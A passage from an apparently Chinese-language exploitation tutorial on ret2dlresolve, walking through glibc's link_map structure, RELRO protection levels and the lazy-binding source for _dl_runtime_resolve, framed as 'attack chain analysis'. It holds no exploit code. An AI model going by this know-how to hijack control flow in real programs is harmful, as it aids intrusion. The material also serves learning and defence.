style="color:#666666">;</span><span style="color:#758575DD">                /* Absolute file name object was found in.  */</span><br><span style="color:#80A665">    ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Dyn</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">l_ld</span><span style="color:#666666">;</span><span style="color:#758575DD">                /* Dynamic section of the shared object.  */</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> link_map </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">l_next</span><span style="color:#666666">,</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">l_prev</span><span style="color:#666666">;</span><span style="color:#758575DD"> /* Chain of loaded objects.  */</span><br><span style="color:#758575DD">    /* All following members are internal to the dynamic linker.</span><br><span style="color:#758575DD">       They may change without notice.  */</span><br><span style="color:#758575DD">    /* This is an element which is only ever different from a pointer to</span><br><span style="color:#758575DD">       the very same copy of this type for ld.so when it is used in more</span><br><span style="color:#758575DD">       than one namespace.  */</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> link_map </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">l_real</span><span style="color:#666666">;</span><br><span style="color:#758575DD">    /* Number of the namespace this link map belongs to.  */</span><br><span style="color:#B8A965">    Lmid_t</span><span style="color:#DBD7CAEE"> l_ns</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> libname_list </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">l_libname</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">    ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Dyn</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">l_info</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">DT_NUM </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> DT_THISPROCNUM </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> DT_VERSIONTAGNUM </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> DT_EXTRANUM </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> DT_VALNUM </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> DT_ADDRNUM</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    const</span><span style="color:#80A665"> ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Phdr</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">l_phdr</span><span style="color:#666666">;</span><span style="color:#758575DD">        /* Pointer to program header table in core.  */</span><br><span style="color:#80A665">    ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> l_entry</span><span style="color:#666666">;</span><span style="color:#758575DD">                /* Entry point location.  */</span><br><span style="color:#80A665">    ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Half</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> l_phnum</span><span style="color:#666666">;</span><span style="color:#758575DD">                /* Number of program header entries.  */</span><br><span style="color:#80A665">    ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Half</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> l_ldnum</span><span style="color:#666666">;</span><span style="color:#758575DD">                /* Number of dynamic segment entries.  */</span><br></code></pre></div>
<h3 id="relro(relocation-read-only)" class="scroll-target"><a href="#relro(relocation-read-only)"><code class="hash inline-code">#</code>RELRO(Relocation Read-Only)</a></h3>
<p>重定位段只读保护分为以下三个等级：</p>
<ol>
<li>NO RELRO：保护未开的情况，所有重定位段均可写，包括 .dynamic、.got、.got.plt；</li>
<li>Partial RELRO：部分开启保护，其为 GCC 编译的默认配置。.dynamic、.got 被标记为只读，并且会强制地将 ELF 的内部数据段 .got，.got.plt 等放到外部数据段 .data、.bss之前，即防止程序数据段溢出改变内部数据段的值，从而劫持程序控制流。虽然 .got 标记为只读，但是 .got.plt 仍然可写，即仍然可以改写 GOT 表劫持程序控制流；</li>
<li>Full RELRO：继承 Partial RELRO 的所有保护，并且 .got.plt 也被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要 <code class="inline-code">link_map</code> 以及 <code class="inline-code">dl_runtime_resolve</code> 函数，则GOT表中这两项数据均置为 0，此时 <code class="inline-code">ret2dlresolve</code> 技术最关键的两项数据丢失，并且GOT表不可写。</li>
</ol>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>攻击链分析</a></h2>
<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>源码</a></h3>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#A0ADA0">/* Set up the loaded object described by L so its unrelocated PLT</span><br><span style="color:#A0ADA0">   entries will jump to the on-demand fixup code in dl-runtime.c.  */</span><br><br><span style="color:#AB5959">static</span><span style="color:#AB5959"> inline</span><span style="color:#AB5959"> int</span><span style="color:#59873A"> __attribute__</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">unused</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#59873A">elf_machine_runtime_setup</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> link_map </span><span style="color:#AB5959">*</span><span style="color:#B07D48">l</span><span style="color:#999999">,</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> r_scope_elem </span><span style="color:#AB5959">*</span><span style="color:#B07D48">scope</span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><br><span style="color:#AB5959">			   int</span><span style="color:#B07D48"> lazy</span><span style="color:#999999">,</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> profile</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48">l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_info</span><span style="color:#a65e2b">[</span><span style="color:#393A34">DT_JMPREL</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> &#x26;&#x26;</span><span style="color:#393A34"> lazy</span><span style="color:#1e754f">)</span><br><span style="color:#999999">    </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">      ElfW</span><span style="color:#a65e2b">(</span><span style="color:#393A34">Addr</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34">got</span><span style="color:#999999">;</span><br><span style="color:#AB5959">      extern</span><span style="color:#AB5959"> void</span><span style="color:#59873A"> _dl_runtime_resolve</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">ElfW</span><span style="color:#a13865">(</span><span style="color:#393A34">Word</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#393A34">      got </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">ElfW</span><span style="color:#a13865">(</span><span style="color:#393A34">Addr</span><span style="color:#a13865">)</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">)</span><span style="color:#59873A"> D_PTR</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#B07D48"> l_info</span><span style="color:#a13865">[</span><span style="color:#393A34">DT_PLTGOT</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">got</span><span style="color:#a13865">[</span><span style="color:#2F798A">1</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">	  l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_mach</span><span style="color:#999999">.</span><span style="color:#B07D48">plt</span><span style="color:#999999"> =</span><span style="color:#B07D48"> got</span><span style="color:#a13865">[</span><span style="color:#2F798A">1</span><span style="color:#a13865">]</span><span style="color:#AB5959"> +</span><span style="color:#B07D48"> l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_addr</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><span style="color:#B07D48">      got</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">1</span><span style="color:#a65e2b">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">ElfW</span><span style="color:#a13865">(</span><span style="color:#393A34">Addr</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#393A34"> l</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">      /* The got[2] entry contains the address of a function which gets</span><br><span style="color:#A0ADA0">	 called to get the address of a so far unresolved function and</span><br><span style="color:#A0ADA0">	 jump to it.  The profiling extension of the dynamic linker allows</span><br><span style="color:#A0ADA0">	 to intercept the calls to collect information.  In this case we</span><br><span style="color:#A0ADA0">	 don't store the address in the GOT so that all future calls also</span><br><span style="color:#A0ADA0">	 end in this function.  */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">ifdef</span><span style="color:#59873A"> SHARED</span><br><span style="color:#AB5959">      extern</span><span style="color:#AB5959"> void</span><span style="color:#59873A"> _dl_runtime_profile</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">ElfW</span><span style="color:#a13865">(</span><span style="color:#393A34">Word</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> profile</span><span style="color:#a65e2b">)</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">	   got</span><span style="color:#a13865">[</span><span style="color:#2F798A">2</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#59873A">ElfW</span><span style="color:#bda437">(</span><span style="color:#393A34">Addr</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">_dl_runtime_profile</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">	  if</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#59873A">GLRO</span><span style="color:#bda437">(</span><span style="color:#393A34">dl_profile</span><span style="color:#bda437">)</span><span style="color:#AB5959"> !=</span><span style="color:#1E754F"> NULL</span><br><span style="color:#AB5959">	      &#x26;&#x26;</span><span style="color:#59873A"> _dl_name_match_p</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#59873A">GLRO</span><span style="color:#296aa3">(</span><span style="color:#393A34">dl_profile</span><span style="color:#296aa3">)</span><span style="color:#999999">,</span><span style="color:#393A34"> l</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><br><span style="color:#A0ADA0">	    /* Say that we really want profiling and the timers are</span><br><span style="color:#A0ADA0">	       started.  */</span><br><span style="color:#59873A">	    GL</span><span style="color:#a13865">(</span><span style="color:#393A34">dl_profile_map</span><span style="color:#a13865">)</span><span style="color:#999999"> =</span><span style="color:#393A34"> l</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><span style="color:#1E754F">      else</span><br><span style="color:#999999">#</span><span style="color:#1E754F">endif</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">{</span><br><span style="color:#A0ADA0">	  /* This function will get called to fix up the GOT entry</span><br><span style="color:#A0ADA0">	     indicated by the offset on the stack, and then jump to</span><br><span style="color:#A0ADA0">	     the resolved address.  */</span><br><span style="color:#B07D48">	  got</span><span style="color:#a13865">[</span><span style="color:#2F798A">2</span><span style="color:#a13865">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#59873A">ElfW</span><span style="color:#bda437">(</span><span style="color:#393A34">Addr</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">_dl_runtime_resolve</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> lazy</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#758575DD">/* Set up the loaded object described by L so its unrelocated PLT</span><br><span style="color:#758575DD">   entries will jump to the on-demand fixup code in dl-runtime.c.  */</span><br><br><span style="color:#CB7676">static</span><span style="color:#CB7676"> inline</span><span style="color:#CB7676"> int</span><span style="color:#80A665"> __attribute__</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">unused</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#80A665">elf_machine_runtime_setup</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> link_map </span><span style="color:#CB7676">*</span><span style="color:#BD976A">l</span><span style="color:#666666">,</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> r_scope_elem </span><span style="color:#CB7676">*</span><span style="color:#BD976A">scope</span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><br><span style="color:#CB7676">			   int</span><span style="color:#BD976A"> lazy</span><span style="color:#666666">,</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> profile</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A">l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_info</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">DT_JMPREL</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#DBD7CAEE"> lazy</span><span style="color:#4d9375">)</span><br><span style="color:#666666">    </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">      ElfW</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">got</span><span style="color:#666666">;</span><br><span style="color:#CB7676">      extern</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> _dl_runtime_resolve</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">ElfW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Word</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#DBD7CAEE">      got </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">ElfW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> *</span><span style="color:#d4976c">)</span><span style="color:#80A665"> D_PTR</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#BD976A"> l_info</span><span style="color:#d9739f">[</span><span style="color:#DBD7CAEE">DT_PLTGOT</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">got</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><br><span style="color:#666666">	</span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">	  l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_mach</span><span style="color:#666666">.</span><span style="color:#BD976A">plt</span><span style="color:#666666"> =</span><span style="color:#BD976A"> got</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> +</span><span style="color:#BD976A"> l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_addr</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><span style="color:#BD976A">      got</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">1</span><span style="color:#d4976c">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">ElfW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE"> l</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">      /* The got[2] entry contains the address of a function which gets</span><br><span style="color:#758575DD">	 called to get the address of a so far unresolved function and</span><br><span style="color:#758575DD">	 jump to it.  The profiling extension of the dynamic linker allows</span><br><span style="color:#758575DD">	 to intercept the calls to collect information.  In this case we</span><br><span style="color:#758575DD">	 don't store the address in the GOT so that all future calls also</span><br><span style="color:#758575DD">	 end in this function.  */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">ifdef</span><span style="color:#80A665"> SHARED</span><br><span style="color:#CB7676">      extern</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> _dl_runtime_profile</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">ElfW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Word</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE"> profile</span><span style="color:#d4976c">)</span><br><span style="color:#666666">	</span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">	   got</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">2</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#80A665">ElfW</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">_dl_runtime_profile</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">	  if</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#80A665">GLRO</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">dl_profile</span><span style="color:#e6cc77">)</span><span style="color:#CB7676"> !=</span><span style="color:#4D9375"> NULL</span><br><span style="color:#CB7676">	      &#x26;&#x26;</span><span style="color:#80A665"> _dl_name_match_p</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#80A665">GLRO</span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">dl_profile</span><span style="color:#6394bf">)</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> l</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><br><span style="color:#758575DD">	    /* Say that we really want profiling and the timers are</span><br><span style="color:#758575DD">	       started.  */</span><br><span style="color:#80A665">	    GL</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">dl_profile_map</span><span style="color:#d9739f">)</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> l</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><span style="color:#4D9375">      else</span><br><span style="color:#666666">#</span><span style="color:#4D9375">endif</span><br><span style="color:#666666">	</span><span style="color:#d4976c">{</span><br><span style="color:#758575DD">	  /* This function will get called to fix up the GOT entry</span><br><span style="color:#758575DD">	     indicated by the offset on the stack, and then jump to</span><br><span style="color:#758575DD">	     the resolved address.  */</span><br><span style="color:#BD976A">	  got</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">2</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#80A665">ElfW</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">_dl_runtime_resolve</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> lazy</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>这段源码解释了 GOT 表的前三项为什么是：DYNAMIC 节地址、linkmap 地址、<code class="inline-code">_dl_runtime_resolve_xsavec</code> 地址</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> _dl_runtime_resolve</span><span style="color:#393A34">	_dl_runtime_resolve_xsavec</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> _dl_runtime_resolve</span><span style="color:#DBD7CAEE">	_dl_runtime_resolve_xsavec</span><br></code></pre></div>
<p><code class="inline-code">_dl_runtime_resolve</code> 这个函数是用汇编写的，继续看</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-asm language-asm"><span style="color:#393A34">...</span><br><span style="color:#393A34">	.globl _dl_runtime_resolve</span><br><span style="color:#393A34">	.hidden _dl_runtime_resolve</span><br><span style="color:#393A34">	.type _dl_runtime_resolve, @function</span><br><span style="color:#A0ADA0">	# ...</span><br><span style="color:#A0ADA0">	# Copy args pushed by PLT in register.</span><br><span style="color:#A0ADA0">	# %rdi: link_map, %rsi: reloc_index</span><br><span style="color:#AB5959">	mov</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">LOCAL_STORAGE_AREA + </span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#2993a3">(</span><span style="color:#393A34">%BASE</span><span style="color:#2993a3">)</span><span style="color:#393A34">, %RSI_LP</span><br><span style="color:#AB5959">	mov</span><span style="color:#393A34"> LOCAL_STORAGE_AREA</span><span style="color:#2993a3">(</span><span style="color:#393A34">%BASE</span><span style="color:#2993a3">)</span><span style="color:#393A34">, %RDI_LP</span><br><span style="color:#AB5959">	call</span><span style="color:#393A34"> _dl_fixup	</span><span style="color:#A0ADA0">	# Call resolver.</span><br><span style="color:#AB5959">	mov</span><span style="color:#393A34"> %RAX_LP, %R11_LP</span><span style="color:#A0ADA0">	# Save return value</span><br><span style="color:#A0ADA0">	# Get register content back.</span><br><span style="color:#A0ADA0">	# ...</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-asm language-asm"><span style="color:#DBD7CAEE">...</span><br><span style="color:#DBD7CAEE">	.globl _dl_runtime_resolve</span><br><span style="color:#DBD7CAEE">	.hidden _dl_runtime_resolve</span><br><span style="color:#DBD7CAEE">	.type _dl_runtime_resolve, @function</span><br><span style="color:#758575DD">	# ...</span><br><span style="color:#758575DD">	# Copy args pushed by PLT in register.</span><br><span style="color:#758575DD">	# %rdi: link_map, %rsi: reloc_index</span><br><span style="color:#CB7676">	mov</span><span style="color:#DBD7CAEE"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">LOCAL_STORAGE_AREA + </span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">%BASE</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE">, %RSI_LP</span><br><span style="color:#CB7676">	mov</span><span style="color:#DBD7CAEE"> LOCAL_STORAGE_AREA</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">%BASE</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE">, %RDI_LP</span><br><span style="color:#CB7676">	call</span><span style="color:#DBD7CAEE"> _dl_fixup	</span><span style="color:#758575DD">	# Call resolver.</span><br><span style="color:#CB7676">	mov</span><span style="color:#DBD7CAEE"> %RAX_LP, %R11_LP</span><span style="color:#758575DD">	# Save return value</span><br><span style="color:#758575DD">	# Get register content back.</span><br><span style="color:#758575DD">	# ...</span><br></code></pre></div>
<p>可以得知这个函数的原型是 <code class="inline-code">_dl_runtime_resolve(link_map, reloc_index)</code>，继续看：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#A0ADA0">/* All references to the value of l_info[DT_PLTGOT],</span><br><span style="color:#A0ADA0">  l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span><br><span style="color:#A0ADA0">  l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span><br><span style="color:#A0ADA0">  have to be accessed via the D_PTR macro.  The macro is needed since for</span><br><span style="color:#A0ADA0">  most architectures the entry is already relocated - but for some not</span><br><span style="color:#A0ADA0">  and we need to relocate at access time.  */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> D_PTR</span><span style="color:#2993a3">(</span><span style="color:#B07D48">map</span><span style="color:#999999">,</span><span style="color:#B07D48"> i</span><span style="color:#2993a3">)</span><span style="color:#A65E2B"> \</span><br><span style="color:#999999">  </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">map</span><span style="color:#1e754f">)</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">i</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">d_un</span><span style="color:#393A34">.</span><span style="color:#B07D48">d_ptr</span><span style="color:#AB5959"> +</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">dl_relocate_ld</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">map</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ?</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959"> :</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">map</span><span style="color:#a65e2b">)</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> LOOKUP_VALUE_ADDRESS</span><span style="color:#2993a3">(</span><span style="color:#B07D48">map</span><span style="color:#999999">,</span><span style="color:#B07D48"> set</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">set</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ||</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">map</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ?</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">map</span><span style="color:#1e754f">)</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_addr</span><span style="color:#AB5959"> :</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">/* Calculate the address of symbol REF using the base address from map MAP,</span><br><span style="color:#A0ADA0">   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> SYMBOL_ADDRESS</span><span style="color:#2993a3">(</span><span style="color:#B07D48">map</span><span style="color:#999999">,</span><span style="color:#B07D48"> ref</span><span style="color:#999999">,</span><span style="color:#B07D48"> map_set</span><span style="color:#2993a3">)</span><span style="color:#A65E2B">				\</span><br><span style="color:#999999">  </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">ref</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ==</span><span style="color:#1E754F"> NULL</span><span style="color:#AB5959"> ?</span><span style="color:#2F798A"> 0</span><span style="color:#A65E2B">							\</span><br><span style="color:#AB5959">   :</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">__glibc_unlikely</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#a13865">(</span><span style="color:#393A34">ref</span><span style="color:#a13865">)</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">st_shndx</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> SHN_ABS</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ?</span><span style="color:#2F798A"> 0</span><span style="color:#A65E2B">			\</span><br><span style="color:#AB5959">      :</span><span style="color:#59873A"> LOOKUP_VALUE_ADDRESS</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">map</span><span style="color:#999999">,</span><span style="color:#393A34"> map_set</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">ref</span><span 